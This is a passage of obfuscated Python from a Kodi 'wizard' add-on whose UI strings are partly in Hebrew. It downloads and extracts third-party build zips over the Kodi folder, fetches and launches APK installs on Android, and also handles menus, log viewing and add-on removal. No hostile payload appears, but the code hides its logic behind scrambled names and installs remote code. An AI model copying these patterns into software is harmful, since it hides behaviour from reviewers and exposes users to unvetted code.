			O000O00OO000OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4296
			OOOO00OO0O00000O0 =open (O000O00OO000OOOOO ,'r')#line:4298
			OO00O0O000000000O =OOOO00OO0O00000O0 .read ()#line:4299
			OOOO00OO0O00000O0 .close ()#line:4300
			OO000O0O0O0OOO00O ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4301
			OO00OOOOO0OOO0000 =re .compile (OO000O0O0O0OOO00O ).findall (OO00O0O000000000O )[0 ]#line:4302
			OOOO00OO0O00000O0 =open (O000O00OO000OOOOO ,'w')#line:4303
			OOOO00OO0O00000O0 .write (OO00O0O000000000O .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%OO00OOOOO0OOO0000 ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4304
			OOOO00OO0O00000O0 .close ()#line:4305
		except :#line:4310
			pass #line:4311
def thirdPartyInstall (O0000O000O0O000O0 ,OO0OO000OOO0O00OO ):#line:4313
	if not wiz .workingURL (OO0OO000OOO0O00OO ):#line:4314
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4315
	OOOOOOO0O0O0O0000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000O000O0O000O0 ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4316
	if OOOOOOO0O0O0O0000 ==1 :#line:4317
		freshStart ('third',True )#line:4318
	wiz .clearS ('build')#line:4319
	OO0OO0000OOO0OOOO =O0000O000O0O000O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4320
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4321
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000O000O0O000O0 ),'','אנא המתן')#line:4322
	O0OO00O00000O0OO0 =os .path .join (PACKAGES ,'%s.zip'%OO0OO0000OOO0OOOO )#line:4323
	try :os .remove (O0OO00O00000O0OO0 )#line:4324
	except :pass #line:4325
	downloader .download (OO0OO000OOO0O00OO ,O0OO00O00000O0OO0 ,DP )#line:4326
	xbmc .sleep (1000 )#line:4327
	O0OO0O0O0O0OOO0OO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000O000O0O000O0 )#line:4328
	DP .update (0 ,O0OO0O0O0O0OOO0OO ,'','אנא המתן')#line:4329
	OOO00OOO000OO0O00 ,OOOO000O0OO00000O ,O000000000O0OOOOO =extract .all (O0OO00O00000O0OO0 ,HOME ,DP ,title =O0OO0O0O0O0OOO0OO )#line:4330
	if int (float (OOO00OOO000OO0O00 ))>0 :#line:4331
		wiz .fixmetas ()#line:4332
		wiz .lookandFeelData ('save')#line:4333
		wiz .defaultSkin ()#line:4334
		wiz .setS ('installed','true')#line:4336
		wiz .setS ('extract',str (OOO00OOO000OO0O00 ))#line:4337
		wiz .setS ('errors',str (OOOO000O0OO00000O ))#line:4338
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOO00OOO000OO0O00 ,OOOO000O0OO00000O ))#line:4339
		try :os .remove (O0OO00O00000O0OO0 )#line:4340
		except :pass #line:4341
		if int (float (OOOO000O0OO00000O ))>0 :#line:4342
			OOO0O0OOO0OO000O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000O000O0O000O0 ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OOO00OOO000OO0O00 ,'%',COLOR1 ,OOOO000O0OO00000O ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4343
			if OOO0O0OOO0OO000O0 :#line:4344
				if isinstance (OOOO000O0OO00000O ,unicode ):#line:4345
					O000000000O0OOOOO =O000000000O0OOOOO .encode ('utf-8')#line:4346
				wiz .TextBox (ADDONTITLE ,O000000000O0OOOOO )#line:4347
	DP .close ()#line:4348
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4349
	if INSTALLMETHOD ==1 :OOO00O00O0O0OO0O0 =1 #line:4350
	elif INSTALLMETHOD ==2 :OOO00O00O0O0OO0O0 =0 #line:4351
	else :OOO00O00O0O0OO0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4352
	if OOO00O00O0O0OO0O0 ==1 :wiz .reloadFix ()#line:4353
	else :wiz .killxbmc (True )#line:4354
def testTheme (O0O0O000O00OO00OO ):#line:4356
	OOOO0O000O0OO0OO0 =zipfile .ZipFile (O0O0O000O00OO00OO )#line:4357
	for OOO000O0000O000OO in OOOO0O000O0OO0OO0 .infolist ():#line:4358
		if '/settings.xml'in OOO000O0000O000OO .filename :#line:4359
			return True #line:4360
	return False #line:4361
def testGui (OO0O00OOOO00OO00O ):#line:4363
	O0OOOOOOO0000OOOO =zipfile .ZipFile (OO0O00OOOO00OO00O )#line:4364
	for O0O0OO0O0OO0OOO00 in O0OOOOOOO0000OOOO .infolist ():#line:4365
		if '/guisettings.xml'in O0O0OO0O0OO0OOO00 .filename :#line:4366
			return True #line:4367
	return False #line:4368
def apkInstaller (OOO0OOO0000O00OOO ,O0OOO000OO0O0OOO0 ):#line:4370
	wiz .log (OOO0OOO0000O00OOO )#line:4371
	wiz .log (O0OOO000OO0O0OOO0 )#line:4372
	if wiz .platform ()=='android':#line:4373
		OO0000O0OOO0O00O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OOO0000O00OOO ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4374
		if not OO0000O0OOO0O00O0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4375
		OOO0O0OO0O0O00OOO =OOO0OOO0000O00OOO #line:4376
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4377
		if not wiz .workingURL (O0OOO000OO0O0OOO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4378
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0O0OO0O0O00OOO ),'','אנא המתן')#line:4379
		OOO0OOOOO00OO000O =os .path .join (PACKAGES ,"%s.apk"%OOO0OOO0000O00OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4380
		try :os .remove (OOO0OOOOO00OO000O )#line:4381
		except :pass #line:4382
		downloader .download (O0OOO000OO0O0OOO0 ,OOO0OOOOO00OO000O ,DP )#line:4383
		xbmc .sleep (100 )#line:4384
		DP .close ()#line:4385
		notify .apkInstaller (OOO0OOO0000O00OOO )#line:4386
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OOO0OOOOO00OO000O +'")')#line:4387
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4388
def createMenu (OO000OO0OOO00O0OO ,O0O00O0O0OO00OOOO ,O0000000OO000000O ):#line:4394
	if OO000OO0OOO00O0OO =='saveaddon':#line:4395
		O0OO0O0O0000O000O =[]#line:4396
		O0O00OOOO00000000 =urllib .quote_plus (O0O00O0O0OO00OOOO .lower ().replace (' ',''))#line:4397
		O00OOO0O0O00O00OO =O0O00O0O0OO00OOOO .replace ('Debrid','Real Debrid')#line:4398
		OO0OO0O0OO0OOO0O0 =urllib .quote_plus (O0000000OO000000O .lower ().replace (' ',''))#line:4399
		O0000000OO000000O =O0000000OO000000O .replace ('url','URL Resolver')#line:4400
		O0OO0O0O0000O000O .append ((THEME2 %O0000000OO000000O .title (),' '))#line:4401
		O0OO0O0O0000O000O .append ((THEME3 %'Save %s Data'%O00OOO0O0O00O00OO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0O00OOOO00000000 ,OO0OO0O0OO0OOO0O0 )))#line:4402
		O0OO0O0O0000O000O .append ((THEME3 %'Restore %s Data'%O00OOO0O0O00O00OO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0O00OOOO00000000 ,OO0OO0O0OO0OOO0O0 )))#line:4403
		O0OO0O0O0000O000O .append ((THEME3 %'Clear %s Data'%O00OOO0O0O00O00OO ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O0O00OOOO00000000 ,OO0OO0O0OO0OOO0O0 )))#line:4404
	elif OO000OO0OOO00O0OO =='save':#line:4405
		O0OO0O0O0000O000O =[]#line:4406
		O0O00OOOO00000000 =urllib .quote_plus (O0O00O0O0OO00OOOO .lower ().replace (' ',''))#line:4407
		O00OOO0O0O00O00OO =O0O00O0O0OO00OOOO .replace ('Debrid','Real Debrid')#line:4408
		OO0OO0O0OO0OOO0O0 =urllib .quote_plus (O0000000OO000000O .lower ().replace (' ',''))#line:4409
		O0000000OO000000O =O0000000OO000000O .replace ('url','URL Resolver')#line:4410
		O0OO0O0O0000O000O .append ((THEME2 %O0000000OO000000O .title (),' '))#line:4411
		O0OO0O0O0000O000O .append ((THEME3 %'Register %s'%O00OOO0O0O00O00OO ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O0O00OOOO00000000 ,OO0OO0O0OO0OOO0O0 )))#line:4412
		O0OO0O0O0000O000O .append ((THEME3 %'Save %s Data'%O00OOO0O0O00O00OO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0O00OOOO00000000 ,OO0OO0O0OO0OOO0O0 )))#line:4413
		O0OO0O0O0000O000O .append ((THEME3 %'Restore %s Data'%O00OOO0O0O00O00OO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0O00OOOO00000000 ,OO0OO0O0OO0OOO0O0 )))#line:4414
		O0OO0O0O0000O000O .append ((THEME3 %'Import %s Data'%O00OOO0O0O00O00OO ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O0O00OOOO00000000 ,OO0OO0O0OO0OOO0O0 )))#line:4415
		O0OO0O0O0000O000O .append ((THEME3 %'Clear Addon %s Data'%O00OOO0O0O00O00OO ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O0O00OOOO00000000 ,OO0OO0O0OO0OOO0O0 )))#line:4416
	elif OO000OO0OOO00O0OO =='install':#line:4417
		O0OO0O0O0000O000O =[]#line:4418
		OO0OO0O0OO0OOO0O0 =urllib .quote_plus (O0000000OO000000O )#line:4419
		O0OO0O0O0000O000O .append ((THEME2 %O0000000OO000000O ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,OO0OO0O0OO0OOO0O0 )))#line:4420
		O0OO0O0O0000O000O .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,OO0OO0O0OO0OOO0O0 )))#line:4421
		O0OO0O0O0000O000O .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,OO0OO0O0OO0OOO0O0 )))#line:4422
		O0OO0O0O0000O000O .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,OO0OO0O0OO0OOO0O0 )))#line:4423
		O0OO0O0O0000O000O .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,OO0OO0O0OO0OOO0O0 )))#line:4424
	O0OO0O0O0000O000O .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4425
	return O0OO0O0O0000O000O #line:4426
def toggleCache (O0OO0000O0O0OOO00 ):#line:4428
	O0O00000OOOO0O00O =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4429
	O0OOO00OO000O0O00 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4430
	if O0OO0000O0O0OOO00 in ['true','false']:#line:4431
		for O00OO0O000OOOO000 in O0O00000OOOO0O00O :#line:4432
			wiz .setS (O00OO0O000OOOO000 ,O0OO0000O0O0OOO00 )#line:4433
	else :#line:4434
		if not O0OO0000O0O0OOO00 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4435
			try :#line:4436
				O00OO0O000OOOO000 =O0OOO00OO000O0O00 [O0O00000OOOO0O00O .index (O0OO0000O0O0OOO00 )]#line:4437
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,O00OO0O000OOOO000 ))#line:4438
			except :#line:4439
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,O0OO0000O0O0OOO00 ))#line:4440
		else :#line:4441
			OOOO00OO00O000OOO ='true'if wiz .getS (O0OO0000O0O0OOO00 )=='false'else 'false'#line:4442
			wiz .setS (O0OO0000O0O0OOO00 ,OOOO00OO00O000OOO )#line:4443
def playVideo (OOOO0OOOO0OO00OO0 ):#line:4445
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OOOO0OOOO0OO00OO0 )#line:4446
	if 'watch?v='in OOOO0OOOO0OO00OO0 :#line:4447
		OO0O0O00OO00O0O0O ,OO00OOO000OOOOO00 =OOOO0OOOO0OO00OO0 .split ('?')#line:4448
		O0OOOO0OO00OOO0OO =OO00OOO000OOOOO00 .split ('&')#line:4449
		for OO00OO00O00OO00O0 in O0OOOO0OO00OOO0OO :#line:4450
			if OO00OO00O00OO00O0 .startswith ('v='):#line:4451
				OOOO0OOOO0OO00OO0 =OO00OO00O00OO00O0 [2 :]#line:4452
				break #line:4453
			else :continue #line:4454
	elif 'embed'in OOOO0OOOO0OO00OO0 or 'youtu.be'in OOOO0OOOO0OO00OO0 :#line:4455
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OOOO0OOOO0OO00OO0 )#line:4456
		OO0O0O00OO00O0O0O =OOOO0OOOO0OO00OO0 .split ('/')#line:4457
		if len (OO0O0O00OO00O0O0O [-1 ])>5 :#line:4458
			OOOO0OOOO0OO00OO0 =OO0O0O00OO00O0O0O [-1 ]#line:4459
		elif len (OO0O0O00OO00O0O0O [-2 ])>5 :#line:4460
			OOOO0OOOO0OO00OO0 =OO0O0O00OO00O0O0O [-2 ]#line:4461
	wiz .log ("YouTube URL: %s"%OOOO0OOOO0OO00OO0 )#line:4462
	yt .PlayVideo (OOOO0OOOO0OO00OO0 )#line:4463
def viewLogFile ():#line:4465
	OOOOO0OOO0OOO0OOO =wiz .Grab_Log (True )#line:4466
	O000O00O0OO00OOO0 =wiz .Grab_Log (True ,True )#line:4467
	OO0OO0OO00O00OO00 =0 ;OO0OOOO0OO0O0OO00 =OOOOO0OOO0OOO0OOO #line:4468
	if not O000O00O0OO00OOO0 ==False and not OOOOO0OOO0OOO0OOO ==False :#line:4469
		OO0OO0OO00O00OO00 =DIALOG .select (ADDONTITLE ,["View %s"%OOOOO0OOO0OOO0OOO .replace (LOG ,""),"View %s"%O000O00O0OO00OOO0 .replace (LOG ,"")])#line:4470
		if OO0OO0OO00O00OO00 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4471
	elif OOOOO0OOO0OOO0OOO ==False and O000O00O0OO00OOO0 ==False :#line:4472
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4473
		return #line:4474
	elif not OOOOO0OOO0OOO0OOO ==False :OO0OO0OO00O00OO00 =0 #line:4475
	elif not O000O00O0OO00OOO0 ==False :OO0OO0OO00O00OO00 =1 #line:4476
	OO0OOOO0OO0O0OO00 =OOOOO0OOO0OOO0OOO if OO0OO0OO00O00OO00 ==0 else O000O00O0OO00OOO0 #line:4478
	O000OO0OOO00O0O0O =wiz .Grab_Log (False )if OO0OO0OO00O00OO00 ==0 else wiz .Grab_Log (False ,True )#line:4479
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OO0OOOO0OO0O0OO00 ),O000OO0OOO00O0O0O )#line:4481
def errorChecking (log =None ,count =None ,all =None ):#line:4483
	if log ==None :#line:4484
		OO0000000OO0OO0O0 =wiz .Grab_Log (True )#line:4485
		OOO0OO000O0OOOO00 =wiz .Grab_Log (True ,True )#line:4486
		if not OOO0OO000O0OOOO00 ==False and not OO0000000OO0OO0O0 ==False :#line:4487
			O000OOO0O0OO0O000 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(OO0000000OO0OO0O0 .replace (LOG ,""),errorChecking (OO0000000OO0OO0O0 ,True ,True )),"View %s: %s error(s)"%(OOO0OO000O0OOOO00 .replace (LOG ,""),errorChecking (OOO0OO000O0OOOO00 ,True ,True ))])#line:4488
			if O000OOO0O0OO0O000 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4489
		elif OO0000000OO0OO0O0 ==False and OOO0OO000O0OOOO00 ==False :#line:4490
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4491
			return #line:4492
		elif not OO0000000OO0OO0O0 ==False :O000OOO0O0OO0O000 =0 #line:4493
		elif not OOO0OO000O0OOOO00 ==False :O000OOO0O0OO0O000 =1 #line:4494
		log =OO0000000OO0OO0O0 if O000OOO0O0OO0O000 ==0 else OOO0OO000O0OOOO00 #line:4495
	if log ==False :#line:4496
		if count ==None :#line:4497
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4498
			return False #line:4499
		else :#line:4500
			return 0 #line:4501
	else :#line:4502
		if os .path .exists (log ):#line:4503
			OO00OOOOOO0000OOO =open (log ,mode ='r');O00O0OOOO0OOO0OO0 =OO00OOOOOO0000OOO .read ().replace ('\n','').replace ('\r','');OO00OOOOOO0000OOO .close ()#line:4504
			O000OOO0OO0OOO00O =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O00O0OOOO0OOO0OO0 )#line:4505
			if not count ==None :#line:4506
				if all ==None :#line:4507
					O0000OOOOOOOOO00O =0 #line:4508
					for OO0OO0OOO00OOOOOO in O000OOO0OO0OOO00O :#line:4509
						if ADDON_ID in OO0OO0OOO00OOOOOO :O0000OOOOOOOOO00O +=1 #line:4510
					return O0000OOOOOOOOO00O #line:4511
				else :return len (O000OOO0OO0OOO00O )#line:4512
			if len (O000OOO0OO0OOO00O )>0 :#line:4513
				O0000OOOOOOOOO00O =0 ;O0OOOOO00O00OO0O0 =""#line:4514
				for OO0OO0OOO00OOOOOO in O000OOO0OO0OOO00O :#line:4515
					if all ==None and not ADDON_ID in OO0OO0OOO00OOOOOO :continue #line:4516
					else :#line:4517
						O0000OOOOOOOOO00O +=1 #line:4518
						O0OOOOO00O00OO0O0 +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(O0000OOOOOOOOO00O ,OO0OO0OOO00OOOOOO .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4519
				if O0000OOOOOOOOO00O >0 :#line:4520
					wiz .TextBox (ADDONTITLE ,O0OOOOO00O00OO0O0 )#line:4521
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4522
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4523
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4524
ACTION_PREVIOUS_MENU =10 #line:4526
ACTION_NAV_BACK =92 #line:4527
ACTION_MOVE_LEFT =1 #line:4528
ACTION_MOVE_RIGHT =2 #line:4529
ACTION_MOVE_UP =3 #line:4530
ACTION_MOVE_DOWN =4 #line:4531
ACTION_MOUSE_WHEEL_UP =104 #line:4532
ACTION_MOUSE_WHEEL_DOWN =105 #line:4533
ACTION_MOVE_MOUSE =107 #line:4534
ACTION_SELECT_ITEM =7 #line:4535
ACTION_BACKSPACE =110 #line:4536
ACTION_MOUSE_LEFT_CLICK =100 #line:4537
ACTION_MOUSE_LONG_CLICK =108 #line:4538
def LogViewer (default =None ):#line:4540
	class OOOO0OO0O0O000000 (xbmcgui .WindowXMLDialog ):#line:4541
		def __init__ (OOOO0OOO0O0O0000O ,*O00O0OOOO000OOOO0 ,**OOO000O000O0O00OO ):#line:4542
			OOOO0OOO0O0O0000O .default =OOO000O000O0O00OO ['default']#line:4543
		def onInit (O0000O0O0O0O0O0O0 ):#line:4545
			O0000O0O0O0O0O0O0 .title =101 #line:4546
			O0000O0O0O0O0O0O0 .msg =102 #line:4547
			O0000O0O0O0O0O0O0 .scrollbar =103 #line:4548
			O0000O0O0O0O0O0O0 .upload =201 #line:4549
			O0000O0O0O0O0O0O0 .kodi =202 #line:4550
			O0000O0O0O0O0O0O0 .kodiold =203 #line:4551
			O0000O0O0O0O0O0O0 .wizard =204 #line:4552
			O0000O0O0O0O0O0O0 .okbutton =205 #line:4553
			OO00O00OO00OOOO00 =open (O0000O0O0O0O0O0O0 .default ,'r')#line:4554
			O0000O0O0O0O0O0O0 .logmsg =OO00O00OO00OOOO00 .read ()#line:4555
			OO00O00OO00OOOO00 .close ()#line:4556
			O0000O0O0O0O0O0O0 .titlemsg ="%s: %s"%(ADDONTITLE ,O0000O0O0O0O0O0O0 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4557
			O0000O0O0O0O0O0O0 .showdialog ()#line:4558
		def showdialog (OOO00O000000O00OO ):#line:4560
			OOO00O000000O00OO .getControl (OOO00O000000O00OO .title ).setLabel (OOO00O000000O00OO .titlemsg )#line:4561
			OOO00O000000O00OO .getControl (OOO00O000000O00OO .msg ).setText (wiz .highlightText (OOO00O000000O00OO .logmsg ))#line:4562
			OOO00O000000O00OO .setFocusId (OOO00O000000O00OO .scrollbar )#line:4563
		def onClick (OOO0OO00000OOO000 ,OOO0O00O0OO0O0OOO ):#line:4565
			if OOO0O00O0OO0O0OOO ==OOO0OO00000OOO000 .okbutton :OOO0OO00000OOO000 .close ()#line:4566
			elif OOO0O00O0OO0O0OOO ==OOO0OO00000OOO000 .upload :OOO0OO00000OOO000 .close ();uploadLog .Main ()#line:4567
			elif OOO0O00O0OO0O0OOO ==OOO0OO00000OOO000 .kodi :#line:4568
				OOO0O0OO00OOO0O00 =wiz .Grab_Log (False )#line:4569
				O0OOO0O0O0OOOOOOO =wiz .Grab_Log (True )#line:4570
				if OOO0O0OO00OOO0O00 ==False :#line:4571
					OOO0OO00000OOO000 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4572
					OOO0OO00000OOO000 .getControl (OOO0OO00000OOO000 .msg ).setText ("Log File Does Not Exists!")#line:4573
				else :#line:4574
					OOO0OO00000OOO000 .titlemsg ="%s: %s"%(ADDONTITLE ,O0OOO0O0O0OOOOOOO .replace (LOG ,''))#line:4575
					OOO0OO00000OOO000 .getControl (OOO0OO00000OOO000 .title ).setLabel (OOO0OO00000OOO000 .titlemsg )#line:4576
					OOO0OO00000OOO000 .getControl (OOO0OO00000OOO000 .msg ).setText (wiz .highlightText (OOO0O0OO00OOO0O00 ))#line:4577
					OOO0OO00000OOO000 .setFocusId (OOO0OO00000OOO000 .scrollbar )#line:4578
			elif OOO0O00O0OO0O0OOO ==OOO0OO00000OOO000 .kodiold :#line:4579
				OOO0O0OO00OOO0O00 =wiz .Grab_Log (False ,True )#line:4580
				O0OOO0O0O0OOOOOOO =wiz .Grab_Log (True ,True )#line:4581
				if OOO0O0OO00OOO0O00 ==False :#line:4582
					OOO0OO00000OOO000 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4583
					OOO0OO00000OOO000 .getControl (OOO0OO00000OOO000 .msg ).setText ("Log File Does Not Exists!")#line:4584
				else :#line:4585
					OOO0OO00000OOO000 .titlemsg ="%s: %s"%(ADDONTITLE ,O0OOO0O0O0OOOOOOO .replace (LOG ,''))#line:4586
					OOO0OO00000OOO000 .getControl (OOO0OO00000OOO000 .title ).setLabel (OOO0OO00000OOO000 .titlemsg )#line:4587
					OOO0OO00000OOO000 .getControl (OOO0OO00000OOO000 .msg ).setText (wiz .highlightText (OOO0O0OO00OOO0O00 ))#line:4588
					OOO0OO00000OOO000 .setFocusId (OOO0OO00000OOO000 .scrollbar )#line:4589
			elif OOO0O00O0OO0O0OOO ==OOO0OO00000OOO000 .wizard :#line:4590
				OOO0O0OO00OOO0O00 =wiz .Grab_Log (False ,False ,True )#line:4591
				O0OOO0O0O0OOOOOOO =wiz .Grab_Log (True ,False ,True )#line:4592
				if OOO0O0OO00OOO0O00 ==False :#line:4593
					OOO0OO00000OOO000 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4594
					OOO0OO00000OOO000 .getControl (OOO0OO00000OOO000 .msg ).setText ("Log File Does Not Exists!")#line:4595
				else :#line:4596
					OOO0OO00000OOO000 .titlemsg ="%s: %s"%(ADDONTITLE ,O0OOO0O0O0OOOOOOO .replace (ADDONDATA ,''))#line:4597
					OOO0OO00000OOO000 .getControl (OOO0OO00000OOO000 .title ).setLabel (OOO0OO00000OOO000 .titlemsg )#line:4598
					OOO0OO00000OOO000 .getControl (OOO0OO00000OOO000 .msg ).setText (wiz .highlightText (OOO0O0OO00OOO0O00 ))#line:4599
					OOO0OO00000OOO000 .setFocusId (OOO0OO00000OOO000 .scrollbar )#line:4600
		def onAction (O0O0000OO0000O0OO ,O0O000O0O0O00OOOO ):#line:4602
			if O0O000O0O0O00OOOO ==ACTION_PREVIOUS_MENU :O0O0000OO0000O0OO .close ()#line:4603
			elif O0O000O0O0O00OOOO ==ACTION_NAV_BACK :O0O0000OO0000O0OO .close ()#line:4604
	if default ==None :default =wiz .Grab_Log (True )#line:4605
	O0O0OOO0O0OOO000O =OOOO0OO0O0O000000 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4606
	O0O0OOO0O0OOO000O .doModal ()#line:4607
	del O0O0OOO0O0OOO000O #line:4608
def removeAddon (OO000O000OO000OOO ,OO00O0O00O0000OOO ,over =False ):#line:4610
	if not over ==False :#line:4611
		O000OO00OOOO0O00O =1 #line:4612
	else :#line:4613
		O000OO00OOOO0O00O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00O0O00O0000OOO ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,OO000O000OO000OOO ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4614
	if O000OO00OOOO0O00O ==1 :#line:4615
		O000000OOO0OO0O0O =os .path .join (ADDONS ,OO000O000OO000OOO )#line:4616
		wiz .log ("Removing Addon %s"%OO000O000OO000OOO )#line:4617
		wiz .cleanHouse (O000000OOO0OO0O0O )#line:4618
		xbmc .sleep (1000 )#line:4619
		try :shutil .rmtree (O000000OOO0OO0O0O )#line:4620
		except Exception as OOOO00O0O00OO00OO :wiz .log ("Error removing %s"%OO000O000OO000OOO ,xbmc .LOGNOTICE )#line:4621
		removeAddonData (OO000O000OO000OOO ,OO00O0O00O0000OOO ,over )#line:4622
	if over ==False :#line:4623
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OO00O0O00O0000OOO ))#line:4624
